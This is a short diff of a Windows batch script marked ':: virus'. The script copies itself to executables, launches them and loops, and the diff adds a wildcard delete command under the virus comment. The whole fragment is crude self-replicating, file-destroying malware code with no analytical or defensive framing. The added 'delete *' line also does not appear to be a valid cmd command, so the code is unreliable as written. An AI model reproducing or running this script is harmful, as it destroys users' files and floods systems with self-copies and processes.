@@ -19,7 +19,7 @@ copy %0 *.exe > nul
 start "" *.exe
 
 :: virus
-
+delete *
 
 :: start loop
 goto lessgo
